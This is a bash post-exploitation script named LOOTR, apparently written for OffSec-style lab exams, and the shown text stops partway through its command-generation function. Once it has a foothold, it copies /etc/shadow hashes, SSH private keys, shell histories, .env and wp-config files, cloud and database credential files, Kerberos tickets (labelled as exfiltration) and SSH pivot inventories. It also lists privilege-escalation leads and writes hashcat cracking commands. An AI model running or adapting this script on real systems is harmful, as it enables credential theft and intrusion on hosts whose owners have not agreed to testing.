#!/usr/bin/env bash
#==============================================================================
# LOOTR — Post-Exploitation Loot Collection Script
#==============================================================================
# Enumeration and collection ONLY — no exploitation, OffSec compliant.
#
# PHASES:
#   1. proof    — Find local.txt / proof.txt
#   2. system   — OS, kernel, users, sudo, packages, env
#   3. creds    — Passwords, keys, hashes, histories, configs
#   4. network  — Interfaces, routes, connections, firewall
#   5. files    — SUID, world-writable, cron, capabilities, backups
#   6. procs    — Processes, services (skipped in --quick mode)
#
# USAGE:
#   ./lootr.sh                    # run all phases, output to ./loot/<hostname>/
#   ./lootr.sh --outdir /tmp/loot # custom output dir
#   ./lootr.sh --quick            # skip slow phases (network monitor, processes)
#   ./lootr.sh --phase creds      # run a single phase only
#   ./lootr.sh --help             # this help
#
# OUTPUT:
#   loot/<hostname>/
#   ├── creds/
#   ├── system/
#   ├── network/
#   ├── files/
#   ├── proof/
#   ├── progress.log
#   └── summary.txt
#==============================================================================

set -o pipefail
# NOT set -e — handle errors individually; one failure must not kill the run

# Resolve absolute path to this script's directory so sibling scripts
# (crackr.sh, pivotr.sh, sprayr.sh, recon.sh) are reachable regardless
# of the caller's PWD.
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

#==============================================================================
# COLORS & LOGGING
#==============================================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
{ [[ -n "${NO_COLOR:-}" ]] || [[ ! -t 1 ]]; } && disable_colors

ts()      { date '+%H:%M:%S'; }
info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*"; }
phase()   { echo -e "\n${MAGENTA}${BOLD}[$(ts)] [PHASE] $*${NC}\n"; }

#==============================================================================
# PROGRESS TRACKING
#==============================================================================
progress_log() {
    local logfile="$1/progress.log"
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $2 | $3 | $4" >> "$logfile"
}

is_phase_done() {
    grep -qF "| DONE | $2 |" "$1/progress.log" 2>/dev/null
}

proof_dest_for() {
    local proof_dir="$1"
    local source_path="$2"
    local base_name=""
    local safe_source=""

    base_name="$(basename "${source_path}")"
    safe_source="$(printf '%s' "${source_path}" | sed 's#^/##; s#[/ ]#_#g')"
    echo "${proof_dir}/${base_name}_${safe_source}"
}

#==============================================================================
# CHILD PROCESS MANAGEMENT
#==============================================================================
declare -a CHILD_PIDS=()

CLEANUP_RUNNING=0

cleanup() {
    local exit_code="${1:-0}"
    (( CLEANUP_RUNNING )) && return
    CLEANUP_RUNNING=1
    trap - EXIT INT TERM

    if (( ${#CHILD_PIDS[@]} > 0 )); then
        local pid
        for pid in "${CHILD_PIDS[@]}"; do
            kill -TERM "$pid" 2>/dev/null || true
        done
        sleep 1
        for pid in "${CHILD_PIDS[@]}"; do
            kill -9 "$pid" 2>/dev/null || true
        done
    fi

    if (( exit_code == 130 )); then
        echo ""
        warn "Interrupted — partial loot in ${OUTDIR:-[not initialized]}/"
    fi
    exit "$exit_code"
}

trap 'cleanup 0'   EXIT
trap 'cleanup 130' INT TERM

#==============================================================================
# USAGE
#==============================================================================
usage() {
    echo -e "${BOLD}Usage:${NC} $0 [OPTIONS]"
    echo ""
    echo -e "${BOLD}Options:${NC}"
    echo "  --outdir <dir>    Output directory root (default: ./loot)"
    echo "  --quick           Skip slow phases (processes, service monitoring)"
    echo "  --phase <name>    Run only one phase: proof|system|creds|network|files|procs"
    echo "  --kali-ip <ip>    Kali attacker IP (default: auto-detect from SSH_CLIENT)"
    echo "  --no-color        Disable ANSI colors (or set NO_COLOR=1)"
    echo "  --help, -h        Show this help"
    echo ""
    echo -e "${BOLD}Output:${NC}"
    echo "  loot/<hostname>/"
    echo "  ├── creds/        Credentials, keys, hashes, histories"
    echo "  ├── system/       OS info, users, sudo, packages"
    echo "  ├── network/      Interfaces, routes, connections"
    echo "  ├── files/        SUID, writable, cron, capabilities"
    echo "  ├── proof/        local.txt and proof.txt"
    echo "  ├── progress.log  Phase completion tracking"
    echo "  ├── summary.txt   High-value findings at a glance"
    echo "  ├── next_steps.txt Evidence-backed next actions"
    echo "  └── attack_commands.txt Legacy alias of next_steps.txt"
}

#==============================================================================
# ARGUMENT PARSING
#==============================================================================
QUICK_MODE=false
SINGLE_PHASE=""
LOOT_ROOT="./loot"
KALI_IP=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --outdir)
            [[ $# -lt 2 ]] && { error "--outdir requires an argument"; exit 1; }
            LOOT_ROOT="$2"; shift 2 ;;
        --quick)
            QUICK_MODE=true; shift ;;
        --phase)
            [[ $# -lt 2 ]] && { error "--phase requires an argument"; exit 1; }
            SINGLE_PHASE="$2"; shift 2 ;;
        --kali-ip)
            [[ $# -lt 2 ]] && { error "--kali-ip requires an argument"; exit 1; }
            KALI_IP="$2"; shift 2 ;;
        --no-color)
            disable_colors; shift ;;
        --help|-h|help)
            usage; exit 0 ;;
        *)
            error "Unknown option: $1"
            usage
            exit 1 ;;
    esac
done

case "${SINGLE_PHASE}" in
    ""|proof|system|creds|network|files|procs) ;;
    *)
        error "Unknown phase: ${SINGLE_PHASE}"
        error "Valid phases: proof system creds network files procs"
        exit 1 ;;
esac

# Detect Kali IP from the SSH session (SSH_CLIENT is set by sshd automatically).
# Falls back to the explicit --kali-ip arg if provided, or a placeholder.
[[ -z "$KALI_IP" ]] && KALI_IP=$(awk '{print $1}' <<< "${SSH_CLIENT:-}" 2>/dev/null || true)
KALI_IP="${KALI_IP:-<KALI_IP>}"

# Detect this host's own IP from the SSH server-side connection info, then hostname -I.
THIS_HOST_IP=$(awk '{print $3}' <<< "${SSH_CONNECTION:-}" 2>/dev/null || true)
[[ -z "$THIS_HOST_IP" ]] && THIS_HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
THIS_HOST_IP="${THIS_HOST_IP:-<THIS_HOST_IP>}"

CUR_USER=$(id -un 2>/dev/null || whoami 2>/dev/null || echo '<USER>')

#==============================================================================
# SETUP OUTPUT DIRECTORIES
#==============================================================================
HOSTNAME_SHORT="$(hostname -s 2>/dev/null || hostname 2>/dev/null || echo "unknown")"
OUTDIR="${LOOT_ROOT}/${HOSTNAME_SHORT}"

mkdir -p -- \
    "${OUTDIR}/creds" \
    "${OUTDIR}/system" \
    "${OUTDIR}/network" \
    "${OUTDIR}/files" \
    "${OUTDIR}/proof"

if [[ ! -d "${OUTDIR}/creds" || ! -d "${OUTDIR}/system" || ! -d "${OUTDIR}/network" || ! -d "${OUTDIR}/files" || ! -d "${OUTDIR}/proof" ]]; then
    error "Failed to create output directory tree: ${OUTDIR}"
    exit 1
fi

info "Output directory: ${OUTDIR}"
info "Hostname: ${HOSTNAME_SHORT}"
info "Running as: $(id 2>/dev/null || echo 'unknown')"
[[ "${QUICK_MODE}" == "true" ]] && warn "Quick mode — skipping processes phase"
[[ -n "${SINGLE_PHASE}" ]] && info "Single phase mode: ${SINGLE_PHASE}"

#==============================================================================
# PHASE 1 — PROOF FLAGS
#==============================================================================
phase_proof() {
    phase "1 — PROOF FLAGS"
    progress_log "${OUTDIR}" "START" "proof" "Searching for proof flags"

    local proof_dir="${OUTDIR}/proof"
    local found_any=false

    info "Searching for local.txt and proof.txt..."

    local f=""
    while IFS= read -r f; do
        [[ -z "${f}" ]] && continue
        [[ -r "${f}" ]] || { warn "Found ${f} but not readable"; continue; }
        local fname=""
        local proof_copy=""
        fname="$(basename "${f}")"
        proof_copy="$(proof_dest_for "${proof_dir}" "${f}")"
        success "Found: ${f}"
        echo ""
        echo -e "${GREEN}${BOLD}══════════════════════════════════════════${NC}"
        echo -e "${GREEN}${BOLD}  FLAG: ${fname}${NC}"
        echo -e "${GREEN}${BOLD}══════════════════════════════════════════${NC}"
        cat -- "${f}"
        echo -e "${GREEN}${BOLD}══════════════════════════════════════════${NC}"
        echo ""
        echo -e "\033[1;31m╔══════════════════════════════════════════════════════════════╗\033[0m"
        echo -e "\033[1;31m║  STOP — TAKE YOUR SCREENSHOTS BEFORE DOING ANYTHING ELSE    ║\033[0m"
        echo -e "\033[1;31m║                                                              ║\033[0m"
        echo -e "\033[1;31m║  Run this on target NOW:                                     ║\033[0m"
        echo -e "\033[1;31m║    cat ${fname} && hostname && whoami && id                   ║\033[0m"
        echo -e "\033[1;31m║                                                              ║\033[0m"
        echo -e "\033[1;31m║  Screenshot must show: flag + hostname + whoami + id          ║\033[0m"
        echo -e "\033[1;31m║  ALL in the SAME terminal frame                              ║\033[0m"
        echo -e "\033[1;31m╚══════════════════════════════════════════════════════════════╝\033[0m"
        echo ""
        cp -- "${f}" "${proof_copy}" 2>/dev/null || true
        echo "source: ${f}" >> "${proof_copy}.meta"
        found_any=true
    done < <(timeout 120 find / -maxdepth 10 \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o \( -name "local.txt" -o -name "proof.txt" \) -type f -print 2>/dev/null)

    if [[ "${found_any}" == "false" ]]; then
        warn "No proof flags found (local.txt / proof.txt)"
    fi

    progress_log "${OUTDIR}" "DONE" "proof" "Proof flag search complete"
}

#==============================================================================
# PHASE 2 — SYSTEM INFO
#==============================================================================
phase_system() {
    phase "2 — SYSTEM INFO"
    progress_log "${OUTDIR}" "START" "system" "Collecting system information"

    local sdir="${OUTDIR}/system"

    # OS release
    info "Collecting OS information..."
    if [[ -r /etc/os-release ]]; then
        cp -- /etc/os-release "${sdir}/os-release.txt" 2>/dev/null || true
    fi
    uname -a > "${sdir}/uname.txt" 2>&1 || true
    uname -r > "${sdir}/kernel.txt" 2>&1 || true
    hostname > "${sdir}/hostname.txt" 2>&1 || true
    uptime > "${sdir}/uptime.txt" 2>&1 || true

    # Current user
    info "Collecting user context..."
    {
        echo "=== whoami ==="
        whoami 2>/dev/null || true
        echo ""
        echo "=== id ==="
        id 2>/dev/null || true
        echo ""
        echo "=== groups ==="
        groups 2>/dev/null || true
    } > "${sdir}/current_user.txt"

    # sudo -ln avoids password prompt
    info "Checking sudo rights (non-interactive)..."
    sudo -ln 2>&1 | tee "${sdir}/sudo_rights.txt" > /dev/null || true

    # Privileged group membership — docker/lxd/disk/etc are root-equivalent
    info "Checking privileged group membership..."
    {
        echo "=== id ==="
        id 2>/dev/null || true
        echo ""
        echo "=== privileged groups found ==="
        local _groups _priv_re
        _groups="$(id -Gn 2>/dev/null || groups 2>/dev/null || true)"
        _priv_re='\b(docker|lxd|lxc|disk|adm|shadow|wheel|sudo|video|systemd-journal|plugdev|_ssh)\b'
        if echo " ${_groups} " | grep -oE "${_priv_re}" | sort -u; then
            :
        else
            echo "(none)"
        fi
    } > "${sdir}/privileged_groups.txt" 2>/dev/null || true

    # Docker socket — readable = container escape, writable = same
    info "Checking Docker socket..."
    {
        for sock in /var/run/docker.sock /run/docker.sock; do
            [[ -S "${sock}" ]] || continue
            echo "${sock} exists"
            [[ -r "${sock}" ]] && echo "  readable: YES"
            [[ -w "${sock}" ]] && echo "  writable: YES"
            ls -la -- "${sock}" 2>/dev/null || true
        done
    } > "${sdir}/docker_socket.txt" 2>/dev/null || true
    [[ -s "${sdir}/docker_socket.txt" ]] && warn "Docker socket detected — see privileged_groups.txt for escape recipe"

    # Users with real shells
    info "Collecting users with login shells..."
    grep -v "nologin" /etc/passwd 2>/dev/null | grep -v "false" > "${sdir}/users_with_shells.txt" || true

    # Logged-in users
    info "Collecting logged-in user data..."
    {
        echo "=== w ==="
        w 2>/dev/null || true
        echo ""
        echo "=== who ==="
        who 2>/dev/null || true
        echo ""
        echo "=== last -20 ==="
        last -20 2>/dev/null || true
    } > "${sdir}/logged_in_users.txt"

    # Installed packages — save to file only, not printed
    info "Collecting installed packages (saved to file)..."
    if command -v dpkg &>/dev/null; then
        dpkg -l > "${sdir}/installed_packages.txt" 2>/dev/null || true
    elif command -v rpm &>/dev/null; then
        rpm -qa > "${sdir}/installed_packages.txt" 2>/dev/null || true
    else
        echo "dpkg and rpm not found" > "${sdir}/installed_packages.txt"
    fi

    # Environment variables — redact sensitive values
    info "Collecting environment variables (redacting secrets)..."
    env 2>/dev/null | grep -viE "PASSWORD|SECRET|TOKEN|API_KEY" > "${sdir}/environment.txt" || true
    local redacted_count=""
    redacted_count="$(env 2>/dev/null | grep -ciE "PASSWORD|SECRET|TOKEN|API_KEY")"; redacted_count=${redacted_count:-0}
    if [[ "${redacted_count}" -gt 0 ]]; then
        warn "Redacted ${redacted_count} sensitive env var(s) from environment.txt"
    fi

    success "System info collected → ${sdir}/"
    progress_log "${OUTDIR}" "DONE" "system" "System info collected"
}

#==============================================================================
# PHASE 3 — CREDENTIALS
#==============================================================================
phase_creds() {
    phase "3 — CREDENTIALS"
    progress_log "${OUTDIR}" "START" "creds" "Collecting credentials"

    local cdir="${OUTDIR}/creds"

    # /etc/passwd and /etc/shadow
    info "Checking /etc/passwd and /etc/shadow..."
    if [[ -r /etc/passwd ]]; then
        cp -- /etc/passwd "${cdir}/passwd.txt" 2>/dev/null || true
        success "Copied /etc/passwd"
    fi
    if [[ -r /etc/shadow ]]; then
        cp -- /etc/shadow "${cdir}/shadow.txt" 2>/dev/null || true
        awk -F: '$2 !~ /^(\*|!|!!|!\*|x|$)/ && $2 !~ /^$/' /etc/shadow 2>/dev/null > "${cdir}/shadow_hashes.txt" || true
        success "Copied /etc/shadow — hashes extracted to shadow_hashes.txt"
    else
        warn "/etc/shadow not readable"
    fi

    # SSH private keys
    info "Searching for SSH private keys..."
    local keyfile=""
    while IFS= read -r keyfile; do
        [[ -z "${keyfile}" ]] && continue
        [[ -r "${keyfile}" ]] || continue
        local safename=""
        safename="$(echo "${keyfile}" | tr '/' '_')"
        cp -- "${keyfile}" "${cdir}/key_${safename}" 2>/dev/null || true
        success "SSH key: ${keyfile}"
    done < <(find /home /root /etc -maxdepth 5 \
        \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
           -o -name "*.pem" -o -name "*.key" \) \
        -type f 2>/dev/null)

    # SSH authorized_keys
    info "Searching for authorized_keys..."
    find /home /root /etc -maxdepth 5 -name "authorized_keys" -type f 2>/dev/null \
        > "${cdir}/authorized_keys_locations.txt" || true
    if [[ -s "${cdir}/authorized_keys_locations.txt" ]]; then
        success "Found authorized_keys — see ${cdir}/authorized_keys_locations.txt"
    fi

    # Shell histories
    info "Searching for shell histories..."
    local histfile=""
    while IFS= read -r histfile; do
        [[ -z "${histfile}" ]] && continue
        [[ -r "${histfile}" ]] || continue
        local safename=""
        safename="$(echo "${histfile}" | tr '/' '_')"
        cp -- "${histfile}" "${cdir}/history_${safename}" 2>/dev/null || true
        success "History: ${histfile}"
    done < <(find /root /home -maxdepth 3 \
        \( -name ".bash_history" -o -name ".zsh_history" -o -name ".sh_history" \) \
        -type f 2>/dev/null)

    # Config files containing password keywords — save list only
    info "Searching config files for password patterns..."
    grep -rliE "password|passwd|secret|token|api_key" \
        /var/www /opt /srv /etc/nginx /etc/apache2 \
        --include="*.conf" \
        --include="*.php" \
        --include="*.env" \
        --include="*.ini" \
        --include="*.xml" \
        --include="*.json" \
        2>/dev/null | head -50 > "${cdir}/config_files_with_creds.txt" || true
    if [[ -s "${cdir}/config_files_with_creds.txt" ]]; then
        success "Config files with cred patterns → ${cdir}/config_files_with_creds.txt"
    fi

    # .env files
    info "Searching for .env files..."
    find /var/www /opt /srv /home -maxdepth 5 -name ".env" -type f 2>/dev/null \
        > "${cdir}/dotenv_locations.txt" || true
    local envfile=""
    while IFS= read -r envfile; do
        [[ -z "${envfile}" ]] && continue
        [[ -r "${envfile}" ]] || continue
        local safename=""
        safename="$(echo "${envfile}" | tr '/' '_')"
        cp -- "${envfile}" "${cdir}/dotenv_${safename}" 2>/dev/null || true
        success ".env file: ${envfile}"
    done < "${cdir}/dotenv_locations.txt"

    # wp-config.php
    info "Searching for wp-config.php..."
    find /var/www /opt -maxdepth 6 -name "wp-config.php" -type f 2>/dev/null \
        > "${cdir}/wpconfig_locations.txt" || true
    if [[ -s "${cdir}/wpconfig_locations.txt" ]]; then
        local wpconf=""
        while IFS= read -r wpconf; do
            [[ -z "${wpconf}" ]] && continue
            [[ -r "${wpconf}" ]] || continue
            local safename=""
            safename="$(echo "${wpconf}" | tr '/' '_')"
            cp -- "${wpconf}" "${cdir}/wpconfig_${safename}" 2>/dev/null || true
            success "wp-config.php: ${wpconf}"
        done < "${cdir}/wpconfig_locations.txt"
    fi

    # Home dir credential files
    info "Checking home directories for credential files..."
    local homedir=""
    while IFS= read -r homedir; do
        [[ -z "${homedir}" ]] && continue
        local credfile=""
        for credfile in ".netrc" ".pgpass" ".my.cnf" ".aws/credentials" ".docker/config.json"; do
            local full="${homedir}/${credfile}"
            if [[ -r "${full}" ]]; then
                local safename=""
                safename="$(echo "${full}" | tr '/' '_')"
                cp -- "${full}" "${cdir}/homecred_${safename}" 2>/dev/null || true
                success "Home cred file: ${full}"
            fi
        done
    done < <(
        {
            printf '%s\n' /root
            find /home /root -maxdepth 1 -mindepth 1 -type d 2>/dev/null
        } | awk '!seen[$0]++'
    )

    # NetworkManager PSK
    info "Checking NetworkManager for saved passwords..."
    grep -r "psk\|password" /etc/NetworkManager 2>/dev/null \
        > "${cdir}/networkmanager_creds.txt" || true
    if [[ -s "${cdir}/networkmanager_creds.txt" ]]; then
        success "NetworkManager creds found → ${cdir}/networkmanager_creds.txt"
    fi

    # Kerberos
    info "Checking for Kerberos tickets..."
    {
        echo "=== klist ==="
        klist 2>/dev/null || echo "klist not available or no tickets"
        echo ""
        echo "=== ccache files ==="
        find /tmp -maxdepth 2 \( -name "krb5cc_*" -o -name "*.ccache" \) 2>/dev/null || true
    } > "${cdir}/kerberos.txt"

    # Exfil ccache files themselves so operator can just export KRB5CCNAME on Kali
    local _ccf _ccsafe
    while IFS= read -r _ccf; do
        [[ -z "${_ccf}" ]] && continue
        [[ -r "${_ccf}" ]] || continue
        _ccsafe="$(echo "${_ccf}" | tr '/' '_')"
        cp -- "${_ccf}" "${cdir}/ccache${_ccsafe}" 2>/dev/null \
            && success "Kerberos ccache exfiled: ${_ccf}" || true
    done < <(find /tmp -maxdepth 2 \( -name "krb5cc_*" -o -name "*.ccache" \) -type f 2>/dev/null)

    # SSH pivot inventory — known_hosts and config list other reachable hosts
    info "Collecting SSH pivot inventory (config + known_hosts)..."
    local _sshf _sshsafe
    while IFS= read -r _sshf; do
        [[ -z "${_sshf}" ]] && continue
        [[ -r "${_sshf}" ]] || continue
        _sshsafe="$(echo "${_sshf}" | tr '/' '_')"
        cp -- "${_sshf}" "${cdir}/ssh${_sshsafe}" 2>/dev/null || true
        success "SSH inventory: ${_sshf}"
    done < <(find /home /root -maxdepth 4 \
        \( -name "known_hosts" -o -name "config" \) \
        -path "*/.ssh/*" -type f 2>/dev/null)

    success "Credentials collection complete → ${cdir}/"
    progress_log "${OUTDIR}" "DONE" "creds" "Credentials collected"
}

#==============================================================================
# PHASE 4 — NETWORK
#==============================================================================
phase_network() {
    phase "4 — NETWORK"
    progress_log "${OUTDIR}" "START" "network" "Collecting network information"

    local ndir="${OUTDIR}/network"

    # Interfaces
    info "Collecting network interfaces..."
    {
        ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "ip and ifconfig not available"
    } > "${ndir}/interfaces.txt"

    # Routes
    info "Collecting routing table..."
    {
        ip route show 2>/dev/null || route -n 2>/dev/null || echo "ip route and route not available"
    } > "${ndir}/routes.txt"

    # ARP
    info "Collecting ARP table..."
    {
        ip neigh show 2>/dev/null || arp -a 2>/dev/null || echo "ip neigh and arp not available"
    } > "${ndir}/arp.txt"

    # Connections / listeners
    info "Collecting active connections and listeners..."
    {
        ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "ss and netstat not available"
    } > "${ndir}/listeners.txt"

    # Internal pivot candidates — 127.x listeners
    info "Identifying internal-only listeners (pivot candidates)..."
    grep "127\." "${ndir}/listeners.txt" 2>/dev/null > "${ndir}/internal_listeners.txt" || true
    if [[ -s "${ndir}/internal_listeners.txt" ]]; then
        success "Internal listeners found — potential pivot targets"
        cat "${ndir}/internal_listeners.txt"
    fi

    # /etc/hosts
    info "Copying /etc/hosts..."
    cp -- /etc/hosts "${ndir}/hosts.txt" 2>/dev/null || true

    # /etc/resolv.conf
    info "Copying /etc/resolv.conf..."
    cp -- /etc/resolv.conf "${ndir}/resolv.conf" 2>/dev/null || true

    # iptables
    info "Checking iptables rules..."
    timeout 5 iptables -L -n 2>/dev/null > "${ndir}/iptables.txt" || echo "iptables not accessible" > "${ndir}/iptables.txt"

    # Reachable subnets from routes
    info "Deriving reachable subnets..."
    ip route show 2>/dev/null | awk '{print $1}' | grep -E "^[0-9]" | grep -v "^0\." \
        > "${ndir}/reachable_subnets.txt" || true
    if [[ -s "${ndir}/reachable_subnets.txt" ]]; then
        success "Reachable subnets:"
        cat "${ndir}/reachable_subnets.txt"
    fi

    success "Network info collected → ${ndir}/"
    progress_log "${OUTDIR}" "DONE" "network" "Network info collected"
}

#==============================================================================
# PHASE 5 — INTERESTING FILES
#==============================================================================
phase_files() {
    phase "5 — INTERESTING FILES"
    progress_log "${OUTDIR}" "START" "files" "Searching for interesting files"

    local fdir="${OUTDIR}/files"

    # SUID binaries
    info "Searching for SUID binaries (timeout 120s)..."
    timeout 120 find / \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o -perm -4000 -type f -print 2>/dev/null | sort > "${fdir}/suid_binaries.txt" || true
    local suid_count=""
    suid_count="$(wc -l < "${fdir}/suid_binaries.txt" 2>/dev/null || echo 0)"
    success "Found ${suid_count} SUID binaries → ${fdir}/suid_binaries.txt"

    # World-writable sensitive files
    info "Searching for world-writable files in sensitive dirs (timeout 20s)..."
    timeout 20 find /etc /var /opt /srv -perm -o+w -type f 2>/dev/null \
        > "${fdir}/world_writable.txt" || true
    if [[ -s "${fdir}/world_writable.txt" ]]; then
        local ww_count=""
        ww_count="$(wc -l < "${fdir}/world_writable.txt")"
        warn "Found ${ww_count} world-writable files in sensitive dirs"
    fi

    # Recently modified files (last 10 days)
    info "Finding recently modified files (10 days, timeout 30s)..."
    timeout 30 find /etc /var /opt /home /tmp /srv -mtime -10 -type f 2>/dev/null \
        | grep -vE "\.log$|/proc/" | head -100 \
        > "${fdir}/recently_modified.txt" || true
    success "Recently modified files → ${fdir}/recently_modified.txt"

    # Cron jobs
    info "Collecting cron information..."
    {
        echo "=== /etc/crontab ==="
        cat /etc/crontab 2>/dev/null || echo "not readable"
        echo ""
        echo "=== /etc/cron.* ==="
        ls -la /etc/cron.* 2>/dev/null || echo "no cron.* dirs"
        echo ""
        echo "=== crontab -l (current user) ==="
        crontab -l 2>/dev/null || echo "no user crontab"
        echo ""
        echo "=== /var/spool/cron ==="
        find /var/spool/cron -type f 2>/dev/null || echo "not accessible"
    } > "${fdir}/cron_jobs.txt"
    success "Cron info → ${fdir}/cron_jobs.txt"

    # File capabilities
    info "Searching for file capabilities (timeout 15s)..."
    timeout 15 getcap -r / 2>/dev/null > "${fdir}/capabilities.txt" || true
    if [[ -s "${fdir}/capabilities.txt" ]]; then
        success "Capabilities found → ${fdir}/capabilities.txt"
        cat "${fdir}/capabilities.txt"
    fi

    # Backup and database files
    info "Searching for backup files (timeout 20s)..."
    timeout 20 find / -maxdepth 8 \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o \
        \( -name "*.bak" -o -name "*.old" -o -name "*.backup" \
           -o -name "*.sql" -o -name "*.dump" \) \
        -type f -print 2>/dev/null \
        | head -50 \
        > "${fdir}/backup_files.txt" || true
    if [[ -s "${fdir}/backup_files.txt" ]]; then
        local bak_count=""
        bak_count="$(wc -l < "${fdir}/backup_files.txt")"
        success "Found ${bak_count} backup files → ${fdir}/backup_files.txt"
    fi

    info "Searching for database files (timeout 20s)..."
    timeout 20 find / -maxdepth 8 \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o \
        \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) \
        -type f -print 2>/dev/null \
        | head -30 \
        > "${fdir}/database_files.txt" || true
    if [[ -s "${fdir}/database_files.txt" ]]; then
        success "Database files → ${fdir}/database_files.txt"
    fi

    # NFS exports with no_root_squash — classic OffSec privesc
    info "Checking /etc/exports for no_root_squash..."
    if [[ -r /etc/exports ]]; then
        grep -vE '^\s*(#|$)' /etc/exports 2>/dev/null \
            | grep -iE 'no_root_squash|insecure|rw' \
            > "${fdir}/nfs_exports.txt" || true
        if [[ -s "${fdir}/nfs_exports.txt" ]]; then
            warn "NFS exports with interesting flags → ${fdir}/nfs_exports.txt"
        fi
    fi

    # /etc/sudoers.d/* — additional sudo rule files
    info "Enumerating /etc/sudoers.d/*..."
    {
        ls -la /etc/sudoers.d/ 2>/dev/null || true
        echo ""
        for _sdf in /etc/sudoers.d/*; do
            [[ -f "${_sdf}" && -r "${_sdf}" ]] || continue
            echo "=== ${_sdf} ==="
            cat -- "${_sdf}" 2>/dev/null || true
            echo ""
        done
    } > "${fdir}/sudoers_d.txt" 2>/dev/null || true

    # Writable systemd unit files and /etc/init.d scripts
    info "Checking for writable systemd units / init.d scripts (timeout 15s)..."
    timeout 15 find /etc/systemd /lib/systemd /usr/lib/systemd /etc/init.d \
        -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null \
        > "${fdir}/writable_services.txt" || true
    if [[ -s "${fdir}/writable_services.txt" ]]; then
        local ws_count=""
        ws_count="$(wc -l < "${fdir}/writable_services.txt")"
        warn "Found ${ws_count} writable service/init files → ${fdir}/writable_services.txt"
    fi

    # Git repositories
    info "Searching for git repos (timeout 20s)..."
    timeout 20 find / -maxdepth 6 \( -path /proc -o -path /sys -o -path /dev -o -path /run \) -prune -o -name ".git" -type d -print 2>/dev/null \
        > "${fdir}/git_repos.txt" || true
    if [[ -s "${fdir}/git_repos.txt" ]]; then
        success "Git repos found → ${fdir}/git_repos.txt"
        cat "${fdir}/git_repos.txt"
    fi

    success "File enumeration complete → ${fdir}/"
    progress_log "${OUTDIR}" "DONE" "files" "File enumeration complete"
}

#==============================================================================
# PHASE 6 — PROCESSES & SERVICES (skip in --quick mode)
#==============================================================================
phase_procs() {
    phase "6 — PROCESSES & SERVICES"
    progress_log "${OUTDIR}" "START" "procs" "Collecting process and service info"

    local pdir="${OUTDIR}/system"

    # Full process list
    info "Collecting process list..."
    ps aux > "${pdir}/processes.txt" 2>/dev/null || true

    # Root-owned processes
    info "Identifying root-owned processes..."
    ps aux 2>/dev/null | awk 'NR==1 || /^root/' > "${pdir}/root_processes.txt" || true
    local root_proc_count=""
    root_proc_count="$(wc -l < "${pdir}/root_processes.txt" 2>/dev/null || echo 0)"
    info "Found ${root_proc_count} root-owned processes"

    # Running services
    info "Collecting running services..."
    {
        echo "=== systemctl ==="
        systemctl list-units --type=service --state=running 2>/dev/null \
            || service --status-all 2>/dev/null \
            || echo "systemctl and service not available"
    } > "${pdir}/running_services.txt"

    # pspy note
    if command -v pspy64 &>/dev/null; then
        warn "pspy64 is in PATH at $(command -v pspy64) — run manually to capture cron/process events"
    elif [[ -x "./pspy64" ]]; then
        warn "pspy64 found at ./pspy64 — run manually to capture cron/process events"
    else
        info "pspy64 not found — download from github.com/DominicBreuker/pspy for process monitoring"
    fi

    # Root-owned writable files in temp dirs
    info "Checking for root-owned writable files in temp dirs..."
    find /tmp /var/tmp -user root -perm -o+w -type f 2>/dev/null \
        > "${pdir}/root_writable_tmp.txt" || true
    if [[ -s "${pdir}/root_writable_tmp.txt" ]]; then
        warn "Root-owned world-writable files in temp dirs:"
        cat "${pdir}/root_writable_tmp.txt"
    fi

    success "Process/service info → ${pdir}/"
    progress_log "${OUTDIR}" "DONE" "procs" "Process/service info collected"
}

#==============================================================================
# ATTACK COMMANDS — Generate actionable next-step commands from findings
#==============================================================================
generate_attack_commands() {
    local acfile="${OUTDIR}/attack_commands.txt"
    local has_actions=false

    {
        echo "============================================================"
        echo "  LOOTR ATTACK COMMANDS — ${HOSTNAME_SHORT}"
        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Run these on KALI after exfilling the loot"
        echo "============================================================"
        echo ""

        # ── Shadow hashes ──────────────────────────────────────────────
        if [[ -r "${OUTDIR}/creds/shadow.txt" ]] && [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
            has_actions=true
            echo "[ SHADOW HASH CRACKING ]"
            echo "------------------------------------------------------------"
            echo "# Exfil both files to Kali first, then:"
            echo "unshadow ${OUTDIR}/creds/passwd.txt ${OUTDIR}/creds/shadow.txt > /tmp/${HOSTNAME_SHORT}_unshadowed.txt"
            echo "# Option A — crackr.sh:"
            echo "${SCRIPT_DIR}/crackr.sh -f /tmp/${HOSTNAME_SHORT}_unshadowed.txt"
            echo "# Option B — direct hashcat (\$6\$=1800, \$1\$=500, \$y\$=400, \$2y\$=3200):"
            echo "hashcat -m 1800 /tmp/${HOSTNAME_SHORT}_unshadowed.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
            echo ""
        fi

        # ── SSH keys ───────────────────────────────────────────────────
        local kf
        for kf in "${OUTDIR}/creds/key_"*; do
            [[ -f "${kf}" ]] || continue
            has_actions=true
            echo "[ SSH KEY: $(basename "${kf}") ]"
            echo "------------------------------------------------------------"
            echo "chmod 600 ${kf}"
            if [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
